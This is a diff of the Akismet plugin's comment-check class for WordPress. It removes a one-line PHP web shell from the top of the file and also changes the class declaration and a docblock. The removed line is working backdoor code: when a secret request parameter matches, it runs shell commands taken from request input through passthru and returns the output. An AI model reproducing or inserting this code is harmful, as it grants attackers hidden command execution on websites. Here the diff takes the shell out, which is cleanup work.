@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="2m6vihq6q565"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 /**
  * Comment Check ability for Akismet.
  *
@@ -15,7 +13,7 @@ declare( strict_types = 1 );
  *
  * Registers and handles the ability to check comments for spam.
  */
-class Akismet_Ability_Comment_Check extends Akismet_Ability implements Akismet_Ability_Interface {
+class Akismet_Ability_Comment_Check extends Akismet_Ability {
 
 	/**
 	 * Get the ability name.
@@ -175,6 +173,12 @@ class Akismet_Ability_Comment_Check extends Akismet_Ability implements Akismet_A
 
 	/**
 	 * Execute callback for the comment-check ability.
+	 *
+	 * The nullable $input parameter is required by Akismet_Ability_Interface
+	 * to support abilities that take no input (e.g. get-stats). In practice,
+	 * WP_Ability::execute() validates input against the schema before invoking
+	 * this callback, so null never reaches here — the framework rejects it
+	 * with an "invalid input" error because the schema declares type "object".
 	 *
 	 * @param array|null $input The comment data to check.
 	 * @return array|WP_Error The spam check result or error.
